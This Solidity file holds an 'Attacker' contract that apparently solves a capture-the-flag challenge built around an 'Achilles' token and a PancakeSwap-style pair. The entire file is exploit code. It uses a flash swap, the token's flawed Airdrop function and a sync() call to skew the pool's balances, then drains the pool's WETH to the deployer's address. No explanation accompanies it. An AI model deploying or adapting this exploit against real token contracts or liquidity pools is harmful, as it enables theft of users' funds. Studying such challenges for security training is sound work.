// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SetUp.sol";
contract Attacker is IPancakeCallee{
    PancakePair public pair;
    WETH public weth ;
    Achilles public achilles;
    SetUp public setup;
    address public deployer;
    uint256 public flag;
    constructor() {
    }

    function init(address setupAddress) public {
        setup = SetUp(setupAddress);
        pair = setup.pair();
        weth = setup.weth();
        achilles = setup.achilles();
        deployer = setup.yourAddress();
    }
    function attack() public {
        flag = 0;
        pair.swap(999 ether,0 ether,address(this),"0xdd");
        achilles.transfer(address(pair),0);
        pair.sync();
        achilles.Airdrop(100);
        flag = 1;
        pair.swap(0,100 ether,address(this),"0xdd");
        weth.transfer(deployer,weth.balanceOf(address(this)));
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{
        if( flag == 0){
            achilles.Airdrop(1);
            weth.transfer(address(pair),weth.balanceOf(address(this)));
            achilles.transfer(address(pair),achilles.balanceOf(address(this)));
        }else{
            achilles.transfer(address(pair),0);
        }
    }
}
